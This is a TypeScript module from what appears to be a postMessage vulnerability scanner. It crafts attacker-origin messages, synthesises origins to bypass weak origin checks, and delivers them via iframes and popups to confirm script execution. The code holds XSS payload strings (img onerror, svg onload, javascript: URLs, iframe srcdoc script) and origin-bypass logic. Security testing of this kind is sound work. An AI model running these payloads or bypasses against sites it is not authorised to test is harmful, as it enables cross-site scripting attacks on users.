/**
 * Exploit verification.
 *
 * Given candidate listeners, deliver attacker-origin messages (built from each
 * handler's inferred schema) through real iframe/popup channels and attribute
 * the resulting effects. The judgement is deliberately conservative: a finding
 * is only "confirmed" when an effect carries attacker-controlled content and is
 * attributable to a handler that ran on attacker-origin input.
 */
import { newMarker } from './probe-session.js';
import {
  ProbeSession,
  type MessageAttempt,
  type EffectRecord,
  type ProbeSessionOptions,
} from './probe-session.js';
import { materializeTemplates } from '../analysis/message-schema.js';
import { attackerOriginsFor, type BypassOrigin } from './bypass.js';
import type { GuardVerdict } from '../analysis/origin-check.js';
import type { CandidateTarget, ListenerProbeResult } from './types.js';

export interface VerifyOptions extends ProbeSessionOptions {
  /** Only probe targets at or below this verdict severity. */
  includeVerdicts?: string[];
  /** Per-listener message budget. */
  messagesPerTarget?: number;
  /** Deliver through these channels (default iframe then popup for top-level). */
  channels?: ('iframe' | 'popup')[];
  /** Try a second pass with spoofed trusted origins for allow-list checks. */
  tryTrustedOrigins?: boolean;
  /** Stop after this many confirmed findings. */
  stopAfterConfirmed?: number;
  onProgress?: (msg: string, data?: any) => void;
}

const WEAK_VERDICTS = new Set(['none', 'weak', 'deny-list', 'data-based', 'source-based', 'unknown', 'post-check']);

export class ExploitVerifier {
  private session: ProbeSession | null = null;
  private opts: VerifyOptions;
  private createdChannel: 'iframe' | 'popup' | null = null;

  constructor(opts: VerifyOptions) {
    this.opts = opts;
  }

  private progress(msg: string, data?: any) {
    this.opts.onProgress?.(msg, data);
  }

  /**
   * A handler inside a nested frame is only reachable by an attacker who embeds
   * *that frame's URL* directly: the nested document's `window.parent` is the
   * attacker page, which is exactly the condition such a handler mishandles.
   * So each target carries the URL to embed for it.
   */
  async ensureSession(channel: 'iframe' | 'popup', targetUrl?: string): Promise<ProbeSession> {
    const url = targetUrl || this.opts.targetUrl;
    if (this.session && this.createdChannel === channel && this.createdTargetUrl === url) return this.session;
    if (this.session) await this.session.close();
    const s = new ProbeSession({ ...this.opts, targetUrl: url });
    await s.start(channel);
    this.session = s;
    this.createdChannel = channel;
    this.createdTargetUrl = url;
    return s;
  }

  private createdTargetUrl: string | null = null;

  /** Origins worth trying, derived from the handler's own validation logic. */
  private bypassOriginsFor(target: CandidateTarget): BypassOrigin[] {
    const verdict = target.semantics.guardVerdict as GuardVerdict;
    if (verdict === 'strong' || verdict === 'same-origin') return [];
    const predicate = target.predicate || null;
    const synth = attackerOriginsFor(predicate, verdict);
    const baseline = this.opts.attackerOrigin;
    if (!synth.some((b) => b.origin === baseline)) {
      synth.push({ origin: baseline, technique: 'baseline attacker origin', against: '—', confidence: 'high' });
    }
    return synth;
  }

  /** Probe a single target across all its candidate messages. */
  async probeTarget(
    target: CandidateTarget,
    channel: 'iframe' | 'popup',
    opts: { maxMessages?: number } = {}
  ): Promise<ListenerProbeResult> {
    // Embed the frame that actually hosts this handler, not the top document.
    const embedUrl = target.frameUrl || this.opts.targetUrl;
    const session = await this.ensureSession(channel, embedUrl);
    const notes: string[] = [];
    const attempts: MessageAttempt[] = [];

    const templates = materializeTemplates(
      target.schema,
      target.schema.protocolSamples || [],
      opts.maxMessages ?? this.opts.messagesPerTarget ?? 14
    );

    // Origins to deliver from. For a weak predicate we synthesise origins that
    // actually satisfy the check, so a passing delivery is proof of bypass. The
    // baseline attacker origin is always included.
    const bypassOrigins = this.bypassOriginsFor(target);
    const originsToTry = bypassOrigins.map((b) => b.origin);

    const candidates: { value: any; label: string }[] = templates.map((t, i) => ({
      value: t,
      label: `template#${i}`,
    }));

    // Payload-bearing messages: for every field that could carry markup or a
    // URL, build a variant whose value embeds a unique script canary.
    const marker = newMarker();
    const payloadVariants = buildPayloadVariants(templates, marker);
    for (const v of payloadVariants) candidates.push({ value: v.value, label: v.label });

    let outcome: ListenerProbeResult['outcome'] = 'not-invoked';
    const collected: EffectRecord[] = [];
    const snippets: string[] = [];
    let confirmedEvidence: ListenerProbeResult['evidence'] | null = null;

    outer: for (const origin of originsToTry) {
      const switched = await session.switchAttackerOrigin(origin, channel);
      if (!switched) {
        notes.push(`could not host the attack page on ${origin}; continuing with the baseline origin`);
      }
      const bypass = bypassOrigins.find((b) => b.origin === origin);
      if (bypass) notes.push(`delivering from ${origin} — ${bypass.technique}`);

      // Origins that differ from the page currently hosting the harness cannot be
      // used for delivery; skip them rather than mislabel an attempt.
      if (session.attackerOriginInUse !== origin) continue;

      for (const c of candidates) {
        const ready = await session.ensureTarget(channel);
        if (!ready) {
          notes.push('target document could not be (re)loaded for probing');
          break outer;
        }
        await session.installCanary(channel, marker);
        const before = await session.snapshot(channel);
        const invBefore = await session.targetInvocationSummary(channel);
        const send = await session.send(channel, c.value, '*');
        if (!send.ok) {
          notes.push(`delivery failed (${c.label}): ${send.error}`);
          attempts.push({
            message: c.value,
            targetOrigin: '*',
            channel,
            schemaSource: c.label,
            delivered: false,
            deliveryError: send.error,
            invoked: [],
            effects: [],
            acted: false,
            senderOrigin: origin,
          });
          continue;
        }
        await session.attackerPage.waitForTimeout(this.opts.settleMs ?? 120);
        const effects = await session.collectEffects(channel, before, marker);
        // A navigation during a message whose payload embedded the marker is
        // attacker-directed even though the new document cannot carry the marker.
        for (const e of effects) {
          if (e.kind === 'navigation') e.attackerControlled = true;
        }
        const invAfter = await session.targetInvocationSummary(channel);
        const newInvocations = diffInvocations(invBefore, invAfter);
        // Learn the operands the handler actually compares the origin against.
        for (const inv of invAfter as any[]) {
          for (const c of inv.originCompares || []) {
            if (!target.runtimeOriginCompares) target.runtimeOriginCompares = [];
            if (!target.runtimeOriginCompares.some((x: any) => x.method === c.method && x.operand === c.operand)) {
              target.runtimeOriginCompares.push(c);
            }
          }
        }

        const attributed = effects.filter((e) => e.attackerControlled);
        const acted =
          attributed.some((e) => e.kind === 'canary' || e.kind === 'sink' || e.kind === 'navigation' || e.kind === 'popup') ||
          attributed.some((e) => e.kind === 'outbound');

        const attempt: MessageAttempt = {
          message: c.value,
          targetOrigin: '*',
          channel,
          schemaSource: c.label,
          delivered: true,
          invoked: newInvocations,
          effects,
          acted,
          senderOrigin: origin,
        };
        attempts.push(attempt);
        collected.push(...effects);
        if (effects.length) snippets.push(summarizeEffects(c.value, effects));

        // Outcome ladder: exploited > acted > invoked-only.
        if (effects.some((e) => e.kind === 'canary' && e.attackerControlled)) {
          outcome = 'exploited';
        } else if (acted) {
          if (outcome !== 'exploited') {
            outcome = 'acted';
            }
        } else if (newInvocations.length && outcome === 'not-invoked') {
          outcome = 'invoked-only';
        }

        if (outcome === 'exploited' && !confirmedEvidence) {
          const shot = await session.captureEvidence(channel, `confirmed-${target.id}`);
          confirmedEvidence = {
            effects: collected.slice(),
            snippets: snippets.slice(),
            consoleLines: session.consoleSnapshot().slice(-30),
            network: session.networkSnapshot().filter((n) => (n.body || '').includes(marker) || n.url.includes(marker)),
            domDiff: JSON.stringify(effects.filter((e) => e.kind === 'dom' || e.kind === 'sink')),
            screenshots: shot.screenshot ? [shot.screenshot] : undefined,
          };
          break outer;
        }
      }
    }

    // Second pass: operands learned from the browser may enable bypass origins
    // that static analysis could not construct (SDK/config-driven comparisons).
    if (outcome !== 'exploited' && target.runtimeOriginCompares?.length && target.predicate &&
        (target.predicate.verdict === 'unknown' || !target.predicate.operands?.length)) {
      const { analyzeHandler } = await import('../analysis/origin-check.js');
      const refined = analyzeHandler(target.source, {
        runtimeOriginCompares: target.runtimeOriginCompares,
        maxDepth: 3,
      });
      if (refined.guard && refined.guard.verdict !== 'none' && refined.guard.verdict !== 'unknown') {
        // Persist the refined verdict so the report and severity model see it.
        target.semantics.guardVerdict = refined.guard.verdict;
        target.semantics.weaknesses = refined.guard.weaknesses;
        target.semantics.evidence = refined.guard.evidence;
        target.semantics.allowedOrigins = refined.guard.allowedOrigins;
        target.predicate = refined.guard;
      }
      if (refined.guard && refined.guard.verdict === 'weak' && refined.guard.operands?.length) {
        const retry = attackerOriginsFor(refined.guard, 'weak').filter(
          (b) => !originsToTry.includes(b.origin)
        );
        for (const b of retry) {
          const switched = await session.switchAttackerOrigin(b.origin, channel);
          if (!switched || session.attackerOriginInUse !== b.origin) continue;
          notes.push(`second pass from ${b.origin} — ${b.technique}`);
          for (const c of candidates) {
            const ready = await session.ensureTarget(channel);
            if (!ready) break;
            await session.installCanary(channel, marker);
            const before = await session.snapshot(channel);
            const send = await session.send(channel, c.value, '*');
            if (!send.ok) continue;
            await session.attackerPage.waitForTimeout(this.opts.settleMs ?? 120);
            const effects = await session.collectEffects(channel, before, marker);
            for (const e of effects) if (e.kind === 'navigation') e.attackerControlled = true;
            const attributed = effects.filter((e) => e.attackerControlled);
            const acted = attributed.some((e) => ['canary', 'sink', 'navigation', 'popup', 'outbound'].includes(e.kind));
            attempts.push({
              message: c.value, targetOrigin: '*', channel, schemaSource: c.label + '@retry',
              delivered: true, invoked: [], effects, acted, senderOrigin: b.origin,
            });
            collected.push(...effects);
            if (effects.some((e) => e.kind === 'canary' && e.attackerControlled)) {
              outcome = 'exploited';
              const shot = await session.captureEvidence(channel, `confirmed-${target.id}`);
              confirmedEvidence = {
                effects: collected.slice(), snippets: snippets.slice(),
                consoleLines: session.consoleSnapshot().slice(-30),
                network: session.networkSnapshot().filter((n) => (n.body || '').includes(marker)),
                screenshots: shot.screenshot ? [shot.screenshot] : undefined,
              };
              break;
            }
            if (acted && outcome === 'not-invoked') outcome = 'acted';
          }
          if (outcome === 'exploited') break;
        }
      }
    }

    // A strong allow-list cannot be bypassed by any origin a browser will
    // produce, so nothing further is attempted for it.
    if (target.semantics.guardVerdict === 'strong' && target.semantics.allowedOrigins.length) {
      notes.push(
        `exact allow-list enforced (${target.semantics.allowedOrigins.join(', ')}); no attacker origin can pass it`
      );
    }

    if (outcome === 'not-invoked' && target.semantics.guardVerdict === 'none') {
      // The listener exists but our messages did not reach it. Most often a
      // schema discriminator we failed to reconstruct.
      notes.push('handler was never invoked by any candidate message; schema may be incomplete');
    }

    const evidence = confirmedEvidence || {
      effects: collected.slice(0, 40),
      snippets: snippets.slice(0, 20),
      consoleLines: session.consoleSnapshot().slice(-20),
      network: session.networkSnapshot().filter((n) => n.body?.includes(marker)).slice(0, 20),
    };

    return {
      target,
      analysis: {
        targetId: target.id,
        verdict: target.semantics.guardVerdict,
        allowedOrigins: target.semantics.allowedOrigins,
        weaknesses: target.semantics.weaknesses,
        evidence: target.semantics.evidence,
        runtimeNotes: notes,
      },
      attempts,
      outcome,
      evidence,
      notes,
    };
  }

  async close(): Promise<void> {
    await this.session?.close();
    this.session = null;
    this.createdChannel = null;
    this.createdTargetUrl = null;
  }
}

function diffInvocations(
  before: any[],
  after: any[]
): MessageAttempt['invoked'] {
  const seen = new Set(before.map((i) => i.id));
  return after
    .filter((i) => !seen.has(i.id))
    .map((i) => ({
      lid: i.lid,
      id: i.id,
      originRead: !!i.originRead,
      sourceRead: !!i.sourceRead,
      dataRead: !!i.dataRead,
      dataPaths: i.paths || [],
      threw: i.threw || null,
      durationMs: i.durationMs || 0,
    }));
}

function summarizeEffects(message: any, effects: EffectRecord[]): string {
  const kinds = Array.from(new Set(effects.map((e) => e.kind)));
  const detail = effects
    .slice(0, 3)
    .map((e) => {
      const d = e.detail || {};
      if (e.kind === 'sink') return `${d.kind}:${String((d.detail && (d.detail.html || d.detail.code || d.detail.url)) || '').slice(0, 80)}`;
      if (e.kind === 'canary') return `canary:${String(d.token).slice(0, 40)}`;
      if (e.kind === 'outbound') return `outbound:${d.channel}:${String(d.url || '').slice(0, 60)}`;
      if (e.kind === 'navigation') return `nav:${String(d.to || '').slice(0, 60)}`;
      if (e.kind === 'dom') return `dom:${JSON.stringify(d).slice(0, 60)}`;
      return e.kind;
    })
    .join(' | ');
  return `msg=${JSON.stringify(message).slice(0, 140)} → ${kinds.join(',')} (${detail})`;
}

/**
 * Build message variants that put a unique script canary into every string
 * field that could plausibly reach a sink. Markup and URL payloads are both
 * produced because different sinks consume different shapes.
 */
export function buildPayloadVariants(
  templates: any[],
  marker: string
): { value: any; label: string }[] {
  const out: { value: any; label: string }[] = [];
  const seen = new Set<string>();
  const scriptPayload = `<img src=x onerror="${marker}()">`;
  // A location/open sink consumes a URL, not markup: point it at the attacker
  // origin with the marker in the path so the navigation is attributable.
  const navPayload = `https://wma-navigation.test/${marker}`;
  const scriptPayload2 = `<svg onload="${marker}()">`;
  const urlPayload = `javascript:${marker}()`;
  const htmlPayload = `<iframe srcdoc="<script>parent.${marker}()<\/script>">`;

  // Prefer templates that carry a discriminator (they unlock real branches);
  // fall back to the first few otherwise. Generic probes are excluded because
  // injecting a payload into every field of {type:'ping'} proves nothing.
  const GENERIC = new Set(['message', 'ping', 'init', 'ready', 'load', 'get', 'set', 'open', 'close', 'pay', 'login', 'auth', 'token', 'navigate', 'resize', 'config', 'action', 'event']);
  const isGeneric = (t: any): boolean => {
    const vals = Object.values(t || {}).filter((v) => typeof v === 'string');
    return vals.length > 0 && vals.every((v) => GENERIC.has(v as string));
  };
  const ordered = [...templates].sort((a, b) => {
    const ga = isGeneric(a) ? 1 : 0;
    const gb = isGeneric(b) ? 1 : 0;
    if (ga !== gb) return ga - gb;
    return Object.keys(b).length - Object.keys(a).length;
  });
  for (let ti = 0; ti < Math.min(ordered.length, 6); ti++) {
    const t = ordered[ti]!;
    if (!t || typeof t !== 'object') continue;
    for (const path of enumerateLeafPaths(t, 3)) {
      for (const [kind, payload] of [
        ['img', scriptPayload],
        ['svg', scriptPayload2],
        ['jsurl', urlPayload],
        ['iframe', htmlPayload],
        ['nav', navPayload],
      ] as const) {
        const v = structuredCloneSafe(t);
        if (!setPath(v, path, payload)) continue;
        const key = JSON.stringify(v);
        if (seen.has(key)) continue;
        seen.add(key);
        out.push({ value: v, label: `payload:${path}:${kind}` });
        if (out.length >= 48) return out;
      }
    }
  }
  return out;
}

function injectPayloadForSchema(template: any, marker: string, target: CandidateTarget): any {
  const v = structuredCloneSafe(template);
  const paths = enumerateLeafPaths(v, 3);
  for (const p of paths) setPath(v, p, `<img src=x onerror="${marker}()">`);
  if (!paths.length) {
    // No string leaves: put the payload at a conventional content field.
    const field = (target.schema.dataFields || [])[0] || 'data';
    v[field] = { html: `<img src=x onerror="${marker}()">` };
  }
  return v;
}

export function enumerateLeafPaths(obj: any, maxDepth: number, prefix = '', depth = 0): string[] {
  if (depth > maxDepth) return [];
  const out: string[] = [];
  for (const [k, v] of Object.entries(obj || {})) {
    const p = prefix ? prefix + '.' + k : k;
    if (v !== null && typeof v === 'object' && !Array.isArray(v)) {
      out.push(...enumerateLeafPaths(v, maxDepth, p, depth + 1));
    } else {
      out.push(p);
    }
  }
  return out;
}

function setPath(obj: any, path: string, value: any): boolean {
  const segs = path.split('.');
  let cur = obj;
  for (let i = 0; i < segs.length - 1; i++) {
    if (cur == null || typeof cur !== 'object') return false;
    cur = cur[segs[i]!];
  }
  if (cur == null || typeof cur !== 'object') return false;
  cur[segs[segs.length - 1]!] = value;
  return true;
}

function structuredCloneSafe<T>(v: T): T {
  try {
    return JSON.parse(JSON.stringify(v));
  } catch {
    return v;
  }
}
